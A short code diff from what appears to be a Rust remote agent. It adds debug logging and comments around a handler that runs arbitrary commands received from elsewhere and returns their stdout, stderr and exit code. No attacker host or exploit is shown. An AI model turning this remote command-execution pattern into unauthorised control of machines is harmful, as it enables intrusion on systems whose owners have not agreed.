@@ -83,11 +83,18 @@ async fn eval(state: Arc<RwLock<State>>) {
             ref command,
             ref args,
         } => {
+            devlog!("Executing Command: {:?}, Args: {:?}", command, args);
+
+            // Execute the received command with arguments
             let output: Output = Command::new(command).args(args).output().await.unwrap();
 
+            // Capture stdout, stderr, and status code
             let stdout = String::from_utf8_lossy(&output.stdout).to_string();
             let stderr = String::from_utf8_lossy(&output.stderr).to_string();
-            let status_code = output.status.code().unwrap_or(-1);
+            let status_code = output.status.code().unwrap_or(-1); // Fallback to -1 if exit code is not available
+
+            // Print the output for debugging
+            devlog!("Command Output: \nSTDOUT: {}\nSTDERR: {}", stdout, stderr);
 
             let response_body = AgentResponseBody::CommandResponse {
                 command: command.to_string(),
